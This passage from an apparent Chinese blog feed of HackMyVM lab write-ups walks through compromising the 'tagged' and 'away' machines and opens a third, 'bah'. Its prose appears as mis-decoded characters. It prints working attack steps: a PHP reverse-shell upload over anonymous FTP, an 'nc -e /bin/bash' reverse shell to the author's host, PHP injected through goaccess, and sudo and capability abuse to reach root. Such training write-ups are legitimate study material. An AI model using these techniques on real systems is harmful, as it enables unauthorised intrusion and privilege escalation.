<h4 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h4><p>æ‰«åˆ°80å’Œ21ç«¯å£ï¼Œåˆ°80ç«¯å£ï¼Œæ˜¯â€œphpipam is ready.â€ï¼Œphpipamæ˜¯ä¸€ä¸ªWeb IPåœ°å€ç®¡ç†åº”ç”¨ç¨‹åºï¼Œç›´æ¥è®¿é—®&#x2F;phpipamåè‡ªåŠ¨è·³è½¬åˆ°ä¸€ä¸ªç™»é™†é¡µé¢</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322105140.png" ></p>
<p>å°è¯•äº†æ³¨å…¥ï¼Œå¼±å£ä»¤å•¥çš„ï¼Œæ‰¾ä¸åˆ°ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ï¼Œæ‰«ç›®å½•èƒ½æ‰«åˆ°å¾ˆå¤šå­ç›®å½•ï¼Œè¿˜æ²¡æœ‰ä»€ä¹ˆåˆ©ç”¨æ€è·¯</p>
<p>è½¬è¿‡å¤´æ¥çœ‹21ç«¯å£ï¼Œlftpç”¨anonymousä¸ºè´¦å·å¯†ç ç™»é™†æˆåŠŸï¼Œåˆ°&#x2F;homeç›®å½•ä¸‹è¿˜èƒ½çŸ¥é“æœ‰ä¸€ä¸ªitaliaè´¦æˆ·</p>
<p>åˆ°&#x2F;var&#x2F;www&#x2F;html&#x2F;phpipamç›®å½•ä¸‹æœ‰å¾ˆå¤šå­ç›®å½•ï¼Œæ²¡ä»€ä¹ˆå¤´ç»ª</p>
<p>è¿™ä¸ªæ—¶å€™çœ‹wpï¼Œè®©æˆ‘çœ¼å‰ä¸€äº®ï¼Œæ€è·¯æ˜¯<strong>ç”¨ä¸€ä¸ªæœç´¢è¯­å¥æœç´¢å¯ä»¥ç¼–è¾‘ä¸Šä¼ çš„å­ç›®å½•ï¼Œç„¶åä¸Šä¼ ä¸€ä¸ªåé—¨phpï¼Œå†åœ¨ç½‘é¡µç«¯è®¿é—®åå¼¹ä¸€ä¸ªshell</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find -l /var/www/html| grep &quot;d.w..w..w.&quot;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322105808.png" ></p>
<p>æ‰¾åˆ°ä¸¤ä¸ªå¯ä»¥ç”¨çš„ç›®å½•ï¼Œæˆ‘åœ¨å…¶ä¸­ä¸€ä¸ªä¸Šä¼ ä¸€ä¸ªåé—¨</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322105947.png" ></p>
<p>ç„¶ååœ¨ç½‘é¡µè®¿é—®&#x2F;phpipam&#x2F;app&#x2F;subnets&#x2F;import-subnet&#x2F;upload&#x2F;php-reverse-shell.php</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322110136.png" ></p>
<p>æˆåŠŸæ‹¿åˆ°ç¬¬ä¸€ä¸ªshell</p>
<h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p>è¾“å…¥<strong>ss -lntp</strong>æŸ¥çœ‹æœ‰å“ªäº›ç«¯å£å¼€æ”¾äº†ï¼Œæ³¨æ„åˆ°æœ‰ä¸€ä¸ª12345ç«¯å£</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322110258.png" ></p>
<p>curlä¸€ä¸‹ï¼Œæ‹¿åˆ°ä¸€å¤§æ®µå­—ç¬¦ä¸²</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322110405.png" ></p>
<p>çœ‹èµ·æ¥åƒbase64ï¼Œæ‹¿åˆ°cyberchefè§£å¯†ä¸€ä¸‹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322112416.png" ></p>
<p>çœ‹åˆ°PNGæ–‡ä»¶å¤´ï¼Œä»¥å›¾ç‰‡çš„å½¢å¼ä¿å­˜ä¸‹æ¥</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322112506.png" ></p>
<p>çŒœæµ‹ä¸­é—´é‚£ä¸€ä¸²æ˜¯å¯†ç ï¼Œç™»é™†italiaè´¦æˆ·</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322112614.png" ></p>
<p>æ‹¿åˆ°ç¬¬äºŒä¸ªshell</p>
<p>sudo -læŸ¥åˆ°fehå¯ä»¥åˆ©ç”¨ï¼Œåœ¨Linuxä¸‹ï¼Œfehæ˜¯ä¸€ä¸ªåŸºäºå‘½ä»¤è¡Œçš„å›¾åƒæŸ¥çœ‹å™¨ã€‚å®ƒç‰¹åˆ«è®¾è®¡ç”¨äºå¿«é€ŸæŸ¥çœ‹å›¾åƒ</p>
<p>çœ‹å¸®åŠ©æ–‡æ¡£ï¼Œ-Aå¯ä»¥æŒ‡å®šä¸€ä¸ª shell å‘½ä»¤ä½œä¸ºè¦åœ¨å›¾åƒä¸Šæ‰§è¡Œçš„åŠ¨ä½œï¼Œé…åˆ-Uä¸æ˜¾ç¤ºå›¾ç‰‡</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322114316.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322114405.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo feh -uA /bin/bash</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322114517.png" ></p>
<p>ææƒæˆåŠŸï¼Œè¿™ä¸ªé¶æœºçš„root.encæ˜¯åŠ å¯†è¿‡çš„ï¼Œ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322114632.png" ></p>
<p>opensslç”Ÿæˆçš„å¯†ç ï¼Œè€Œä¸”å‰é¢æ‹¿åˆ°çš„é‚£å¼ å›¾ç‰‡ï¼Œå³ä¸‹è§’æœ‰ä¸€ä¸²â€œ-aes-256-cbcâ€ï¼Œåº”è¯¥å°±æ˜¯åŠ å¯†ç±»å‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl enc -aes-256-cbc -d -in root.enc -out root.txt -k rootisCLOSE</span><br></pre></td></tr></table></figure>

<p>-dè§£å¯†ï¼Œ-kæŒ‡å®šè§£å¯†æ—¶ä½¿ç”¨çš„å¯†é’¥ï¼Œè§£å¯†å‡ºæ¥æˆåŠŸæ‹¿åˆ°flag</p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>ftpä¸Šä¼ åé—¨ï¼ŒæŸ¥çœ‹å†…éƒ¨å¼€æ”¾ç«¯å£ï¼Œfehçš„åˆ©ç”¨ï¼Œopensslè§£å¯†</p>
<p>æœ€æœ‰æ”¶è·çš„æ˜¯åœ¨ftpé‚£é‡Œæœç´¢çœ‹ç¼–è¾‘çš„ç›®å½•ï¼Œå­¦ä¹ äº†ã€‚</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>å¤ç›˜</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm æ€è·¯å¤ç›˜2</title>
    <url>/2024/03/21/hackmyvm%E5%A4%8D%E7%9B%98%E5%90%88%E9%9B%862/</url>
    <content><![CDATA[<h3 id="tagged"><a href="#tagged" class="headerlink" title="tagged"></a>tagged</h3><p>é¶æœºipï¼š192.168.64.98</p>
<p>æ‰«åˆ°æœ‰80ç«¯å£å’Œ7746ç«¯å£ï¼Œç„¶ååˆ°äº†80ç«¯å£ä¸€è®¿é—®å°±æç¤ºtagged.hmvï¼Œç¬¬ä¸€æ—¶é—´é…ç½®hostsæ–‡ä»¶ï¼Œç„¶åçœ‹åˆ°æºç æœ‰ä¸€å¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tagged.hmv</span><br><span class="line"></span><br><span class="line">&lt;!-- http://xxx.tagged.hmv :D --&gt;</span><br></pre></td></tr></table></figure>

<p>è‡ªç„¶å°±æƒ³åˆ°äº†æ‰«å­åŸŸåï¼Œç»“æœæ‰«ä¸åˆ°ï¼Œç„¶åæ‰«äº†ç›®å½•ï¼Œæ‰«åˆ°äº†index.phpï¼Œreport.phpï¼Œreport.htmlä½†æ˜¯æ²¡æœ‰å†…å®¹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240321235025.png" ></p>
<p>è®¿é—®index.php</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240321235123.png" ></p>
<h5 id="ç¬¬ä¸€ä¸ªç‚¹"><a href="#ç¬¬ä¸€ä¸ªç‚¹" class="headerlink" title="ç¬¬ä¸€ä¸ªç‚¹"></a>ç¬¬ä¸€ä¸ªç‚¹</h5><p><strong>å€ŸåŠ©7746ç«¯å£é…åˆindex.phpåå¼¹shell</strong></p>
<p>ä¸çŸ¥é“æ˜¯äº›ä»€ä¹ˆä¸œè¥¿ï¼Œåœ¨è¿™é‡Œå°±è¢«å¡ä½äº†ï¼Œçœ‹äº†é¢˜è§£æ‰æ˜ç™½ï¼Œ<strong>å½“æˆ‘ä»¬ncè¿æ¥7746ç«¯å£æ—¶è¾“å…¥çš„æ•°æ®ä¼šè¢«å†™å…¥åˆ°index.phpä¸­</strong>ï¼Œæ‰€ä»¥åæ¥å†è®¿é—®index.phpä¼šå‡ºç°å¾ˆä¹±çš„ä¸œè¥¿ï¼Œå°±æ˜¯nmapæ‰«æçš„æ—¶å€™ç•™ä¸‹çš„è®°å½•ï¼ˆè€Œä¸”7746ç«¯å£è¢«nmapæ‰«æåä¼šå…³é—­ï¼Œé‡å¯é¶æœºå°±å¥½äº†ï¼‰ï¼Œæˆ‘ä»¬è‡ªå·±è¿æ¥7746ç«¯å£å‘é€æ•°æ®éªŒè¯ä¸€ä¸‹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240321235415.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-21%2023.54.35.png" ></p>
<p>æ˜¯æˆåŠŸçš„ï¼Œå…¶å®ç°åœ¨å›çœ‹å¯ä»¥åœ¨æœ€ä¸Šé¢çœ‹åˆ°nmapï¼Œå¦‚æœåšçš„æ—¶å€™èƒ½æœ‰å¤šä¸€äº›è”æƒ³å°±å¥½äº†</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240321235555.png" ></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯ç»™7746ç«¯å£å‘é€phpå‘½ä»¤åå¼¹shellï¼Œå†è®¿é—®index.phpï¼Œå°±èƒ½æ¥æ”¶åˆ°äº†</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240321235737.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240321235755.png" ></p>
<h5 id="ç¬¬äºŒä¸ªç‚¹"><a href="#ç¬¬äºŒä¸ªç‚¹" class="headerlink" title="ç¬¬äºŒä¸ªç‚¹"></a>ç¬¬äºŒä¸ªç‚¹</h5><p><strong>åˆ†æä»£ç ï¼Œé¡ºåº”é€»è¾‘æ‹¿åˆ°ç”¨æˆ·çš„shell</strong></p>
<p>æ‹¿åˆ°äº†www-dataçš„shellï¼Œåœ¨htmlç›®å½•ä¸‹ï¼Œæœ‰ä¸ª.goæ–‡ä»¶ï¼Œæ‹¿ç»™aiåˆ†æä¸€ä¸‹</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;bufio&quot;</span>     <span class="comment">// ç”¨äºæä¾›è¯»å–è¾“å…¥çš„å¸®åŠ©å‡½æ•°</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span>       <span class="comment">// æä¾›æ ¼å¼åŒ–è¾“å…¥è¾“å‡ºåŠŸèƒ½</span></span><br><span class="line">    <span class="string">&quot;net&quot;</span>       <span class="comment">// æä¾›ç½‘ç»œç¼–ç¨‹åŠŸèƒ½</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span>        <span class="comment">// æä¾›æ“ä½œç³»ç»ŸåŠŸèƒ½</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span>       <span class="comment">// æä¾›æ—¥å¿—åŠŸèƒ½</span></span><br><span class="line">    <span class="string">&quot;os/exec&quot;</span>   <span class="comment">// ç”¨äºæ‰§è¡Œå¤–éƒ¨å‘½ä»¤</span></span><br><span class="line">    <span class="string">&quot;strings&quot;</span>   <span class="comment">// æä¾›å­—ç¬¦ä¸²å¤„ç†åŠŸèƒ½</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">// ä¸»å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// ç›‘å¬TCPè¿æ¥åœ¨7746ç«¯å£</span></span><br><span class="line">    ln, _ := net.Listen(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;:7746&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="comment">// æ¥å—è¿æ¥</span></span><br><span class="line">        conn, _ := ln.Accept()</span><br><span class="line">        <span class="comment">// å¯åŠ¨ä¸¤ä¸ªå¹¶å‘çš„goroutineæ¥å¤„ç†æ¥æ”¶å’Œå‘é€æ•°æ®</span></span><br><span class="line">        <span class="keyword">go</span> receiveData(conn)</span><br><span class="line">        <span class="keyword">go</span> sendData(conn, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å‘é€æ•°æ®åˆ°å®¢æˆ·ç«¯çš„å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sendData</span><span class="params">(conn net.Conn, mensaje <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">    <span class="comment">// å°†æ¶ˆæ¯å‘é€åˆ°è¿æ¥</span></span><br><span class="line">    fmt.Fprintf(conn, mensaje)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æ¥æ”¶æ¥è‡ªå®¢æˆ·ç«¯çš„æ•°æ®å¹¶å¤„ç†çš„å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">receiveData</span><span class="params">(conn net.Conn)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> tohtml <span class="type">string</span></span><br><span class="line">        <span class="comment">// å‘é€æç¤ºç¬¦ç»™å®¢æˆ·ç«¯</span></span><br><span class="line">        sendData(conn, <span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">        <span class="comment">// è¯»å–å®¢æˆ·ç«¯å‘é€çš„æ¶ˆæ¯</span></span><br><span class="line">        message, _ := bufio.NewReader(conn).ReadString(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="comment">// å»é™¤æ¶ˆæ¯æœ«å°¾çš„æ¢è¡Œç¬¦</span></span><br><span class="line">        message = strings.TrimRight(message, <span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">        <span class="comment">// å°†æ¶ˆæ¯æ ¼å¼åŒ–ä¸ºHTMLæ ¼å¼</span></span><br><span class="line">        tohtml = <span class="string">&quot;&lt;pre&gt;&quot;</span> + message + <span class="string">&quot;&lt;/pre&gt;&quot;</span></span><br><span class="line">        <span class="comment">// å¦‚æœæ”¶åˆ°ç‰¹å®šæ¶ˆæ¯ï¼Œåˆ™æ‰§è¡Œå¤–éƒ¨å‘½ä»¤</span></span><br><span class="line">        OMG := <span class="string">&quot;Deva&quot;</span></span><br><span class="line">        <span class="keyword">if</span> message == OMG &#123;</span><br><span class="line">            cmd := exec.Command(<span class="string">&quot;nc&quot;</span>, <span class="string">&quot;-e&quot;</span>, <span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;7777&quot;</span>)</span><br><span class="line">            _ = cmd.Run()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// æ‰“å¼€æ–‡ä»¶ç”¨äºè¿½åŠ ï¼Œå¹¶å°†HTMLæ¶ˆæ¯å†™å…¥æ–‡ä»¶</span></span><br><span class="line">        file, err := os.OpenFile(<span class="string">&quot;/var/www/html/index.php&quot;</span>, os.O_APPEND|os.O_WRONLY, <span class="number">0644</span>)</span><br><span class="line">        _, _ = fmt.Fprintln(file, tohtml)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            log.Fatal(err)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// å…³é—­æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">defer</span> file.Close()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½œç”¨ä¸€æ˜¯å±•ç¤ºäº†å‘7746ç«¯å£è¾“å…¥ä¿¡æ¯ä¼šè¢«å†™å…¥åˆ°index.phpï¼ŒäºŒæ˜¯è®©æˆ‘ä»¬çŸ¥é“ï¼Œå½“æˆ‘ä»¬å‘7746ç«¯å£å‘é€â€œDevaâ€æ—¶ï¼Œé¶æœºä¼šå‘æœ¬åœ°çš„7777ç«¯å£åå¼¹ä¸€ä¸ªshellï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯ç»™7746ç«¯å£å‘é€ä¿¡æ¯ï¼ŒåŒæ—¶åœ¨åˆšæ‹¿åˆ°çš„shellå¼€å¯7777ç«¯å£ç›‘å¬</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322000433.png" ></p>
<p>é¡ºåˆ©æ‹¿åˆ°shylaçš„è´¦æˆ·</p>
<h5 id="ç¬¬ä¸‰ä¸ªç‚¹"><a href="#ç¬¬ä¸‰ä¸ªç‚¹" class="headerlink" title="ç¬¬ä¸‰ä¸ªç‚¹"></a>ç¬¬ä¸‰ä¸ªç‚¹</h5><p><strong>å€ŸåŠ©goaccessç»™report.phpæ ‡é¢˜å†™å…¥æ¶æ„ä»£ç ï¼Œå†å…å¯†ç æ‰§è¡Œ</strong></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322000556.png" ></p>
<p>sudo -lçœ‹åˆ°æœ‰goaccesså’Œreport.phpï¼ˆç©ºçš„ï¼‰å¯ä»¥åˆ©ç”¨ï¼ŒæŸ¥äº†goaccessçš„ä½œç”¨ï¼Œæ˜¯ä¸€ä¸ªå¯ä»¥å®ç°å¯è§†åŒ–çš„webæ—¥å¿—åˆ†æå·¥å…·ï¼ŒæŸ¥çœ‹äº†å¸®åŠ©æ–‡æ¡£ï¼Œç ”ç©¶åŠå¤©æ²¡æœ‰æ€è·¯ï¼Œæœ€åçœ‹wpçŸ¥é“ä»¥ä¸‹ä¸‰ä¸ªæ¯”è¾ƒå¯ä»¥åˆ©ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-f --log-file=&lt;filename&gt;        - Path to input log file.</span><br><span class="line">-o --output=file.html|json|csv  - Output either an HTML, JSON or a CSV file.</span><br><span class="line">--html-report-title=&lt;title&gt;     - Set HTML report page title and header.</span><br></pre></td></tr></table></figure>

<p>å…ˆéšä¾¿åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªa.logï¼Œç„¶å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u uma goaccess -f a.log -o /var/www/html/report.html --html-report-title=&quot;&lt;?php system(&#x27;bash&#x27;);?&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>ä»¥umaçš„èº«ä»½æ‰§è¡Œgoaccessï¼Œåˆ†æa.logç„¶åæŠŠç»“æœå†™åˆ°report.htmlï¼Œæ ‡é¢˜å†™å…¥phpä»£ç </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shyla@tagged:~$ <span class="built_in">ls</span></span><br><span class="line">a.log  magiccode  user.txt</span><br><span class="line">shyla@tagged:~$ sudo -u uma goaccess -f a.log -o /var/www/html/report.html --html-report-title=<span class="string">&quot;&lt;?php system(&#x27;bash&#x27;);?&gt;&quot;</span></span><br><span class="line">shyla@tagged:~$ sudo /usr/bin/php /var/www/html/report.php</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">root@tagged:/home/shyla<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) grupos=0(root)</span><br></pre></td></tr></table></figure>

<p>ææƒæˆåŠŸ</p>
<h3 id="away"><a href="#away" class="headerlink" title="away"></a>away</h3><p>å¼€äº†80å’Œ22ç«¯å£ï¼Œè®¿é—®80ç«¯å£</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322003701.png" ></p>
<p>ç»™äº†ä¸€ä¸ªç”¨æˆ·åï¼Œä¸‹é¢çš„ä¸œè¥¿æ˜¯ED25519å¯†é’¥ç”Ÿæˆæ—¶äº§ç”Ÿçš„ç•Œé¢ï¼Œå¤§æ¦‚å°±æ˜¯æç¤ºå’Œè¿™ç§ç±»å‹çš„å¯†é’¥æœ‰å…³ï¼ˆæ•´ä¸ªé¶åœºéƒ½å’Œè¿™ä¸ªæœ‰å…³ç³»ï¼‰ã€‚</p>
<p>æ‹¿åˆ°äº†ç”¨æˆ·åå°è¯•çˆ†ç ´å‡ºtulaçš„sshå¯†ç ï¼Œç„¶è€Œä»–éœ€è¦ç§é’¥æ–‡ä»¶ç™»é™†ï¼ŒæŸ¥è¯¢äº†ä¸€ä¸‹ED25519å¯†é’¥çš„ç§é’¥æ–‡ä»¶åæ˜¯id_ed25519ï¼Œç°åœ¨å°±éœ€è¦æ‰¾åˆ°è¿™ä¸ªå¯†é’¥æ–‡ä»¶ï¼Œæ‰«ç›®å½•æ‰«åŠå¤©æ‰«ä¸å‡ºä¸œè¥¿ï¼Œçœ‹äº†wpæ‰çŸ¥é“ï¼Œç›´æ¥å°±æ”¾åœ¨äº†ç½‘é¡µç›®å½•ä¸‹ã€‚</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322004502.png" ></p>
<p>æ‹¿åˆ°åä¿å­˜åˆ°æœ¬åœ°ï¼Œæœ‰äº†ç§é’¥æ–‡ä»¶ç™»é™†è¿˜éœ€è¦å¯†ç ï¼ˆåœ¨å…¬é’¥æ–‡ä»¶å†™äº†ï¼‰</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322004638.png" ></p>
<p>æˆåŠŸæ‹¿åˆ°ç¬¬ä¸€ä¸ªshell</p>
<p>sudo -lçœ‹åˆ°å¯ä»¥å…å¯†ç ç”¨lulaè¿è¡Œwebhookï¼ŒæŸ¥çœ‹å¸®åŠ©æ–‡æ¡£</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322004921.png" ></p>
<p>éœ€è¦ç”¨åˆ°çš„æ˜¯ -hookså’Œ-verbosreï¼Œéœ€è¦ä¸€ä¸ªjsonæ–‡ä»¶</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322005017.png" ></p>
<p>åœ¨githubæ‰¾åˆ°äº†è¿™ä¸ªé¡¹ç›®ï¼Œä¸­é—´å¯ä»¥å†™ä¸€ä¸ªè‡ªå·±çš„shæ–‡ä»¶ï¼Œæˆ‘å†™äº†ä¸€ä¸ª&#x2F;tmp&#x2F;a.shï¼Œç„¶åç¼–è¾‘.jsonæ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tula@away:/tmp$ <span class="built_in">cat</span> a.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">nc -e /bin/bash 192.168.64.3 8888</span><br><span class="line">tula@away:/tmp$ <span class="built_in">cd</span></span><br><span class="line">tula@away:~$ <span class="built_in">ls</span></span><br><span class="line">hooks.json  user.txt</span><br><span class="line">tula@away:~$ <span class="built_in">cat</span> hooks.json</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;cleanup-webhook&quot;</span>,</span><br><span class="line">    <span class="string">&quot;execute-command&quot;</span>: <span class="string">&quot;/tmp/a.sh&quot;</span>,</span><br><span class="line">    <span class="string">&quot;command-working-directory&quot;</span>: <span class="string">&quot;/tmp&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±å¼€å¯äº†æœåŠ¡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tula@away:~$ sudo -u lula /usr/bin/webhook -hooks hooks.json -verbose</span><br><span class="line">[webhook] 2024/03/21 17:54:24 version 2.6.9 starting</span><br><span class="line">[webhook] 2024/03/21 17:54:24 setting up os signal watcher</span><br><span class="line">[webhook] 2024/03/21 17:54:24 attempting to load hooks from hooks.json</span><br><span class="line">[webhook] 2024/03/21 17:54:24 os signal watcher ready</span><br><span class="line">[webhook] 2024/03/21 17:54:24 found 1 hook(s) <span class="keyword">in</span> file</span><br><span class="line">[webhook] 2024/03/21 17:54:24 	loaded: cleanup-webhook</span><br><span class="line">[webhook] 2024/03/21 17:54:24 serving hooks on http://0.0.0.0:9000/hooks/&#123;<span class="built_in">id</span>&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ—¶å€™è¿˜æ²¡å¼¹åˆ°shellï¼Œè¿˜è¦è®¿é—®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.64.97:9000/hooks/cleanup-webhook</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322005703.png" ></p>
<p>æˆåŠŸæ‹¿åˆ°lulaçš„shellï¼Œæœå¯»ææƒæ–¹æ³•ï¼Œç”¨**&#x2F;usr&#x2F;sbin&#x2F;getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null**æŸ¥åˆ°moreæœ‰read_and_searchæƒé™</p>
<p>æ¥ä¸‹æ¥çš„æ€è·¯æ˜¯åˆ©ç”¨moreè¯»å–&#x2F;root&#x2F;.sshä¸‹çš„ç§é’¥æ–‡ä»¶ï¼Œä¾æ—§æ˜¯id_ed25519ï¼Œä¿å­˜ä¸‹æ¥sshç™»é™†</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322010551.png" ></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lula@away:/tmp$ ssh root@127.0.0.1 -i id_ed25519</span><br><span class="line">ssh root@127.0.0.1 -i id_ed25519</span><br><span class="line">Linux away 5.10.0-15-amd64 <span class="comment">#1 SMP Debian 5.10.120-1 (2022-06-09) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Fri Jun 17 11:14:38 2022</span><br><span class="line">root@away:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>ææƒæˆåŠŸ</p>
<h3 id="bah"><a href="#bah" class="headerlink" title="bah"></a>bah</h3><p>åœ°å€ï¼š<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Bah" >https://hackmyvm.eu/machines/machine.php?vm=Bah<i class="fas fa-external-link-alt"></i></a></p>
<p>éš¾åº¦ï¼šeasy</p>
<p>ipï¼š192.168.64.105</p>
<h4 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h4><p>æ‰«åˆ°80å’Œ3306ç«¯å£ï¼Œå…ˆçœ‹çœ‹80ï¼Œæ˜¯ä¸ªqdpmæ¡†æ¶ï¼Œä»–æœ‰ä¸€ä¸ªå¯†ç æš´éœ²çš„pocï¼ˆ<a class="link"   href="https://www.exploit-db.com/exploits/50176%EF%BC%89" >https://www.exploit-db.com/exploits/50176ï¼‰<i class="fas fa-external-link-alt"></i></a></p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325105323.png"   style="zoom:50%;" >

<p>è®¿é—®â€˜&#x2F;core&#x2F;config&#x2F;databases.ymlâ€™ï¼Œä¸‹è½½åˆ°ä¸€ä¸ªymlæ–‡ä»¶</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325105519.png" ></p>
<p>å¯ä»¥çœ‹åˆ°è´¦å·å¯†ç ï¼Œç”¨æ¥ç™»é™†mysql</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325105601.png" ></p>
<p>çœ‹åˆ°hiddenæ•°æ®åº“æ¯”è¾ƒå¯ç–‘</p>
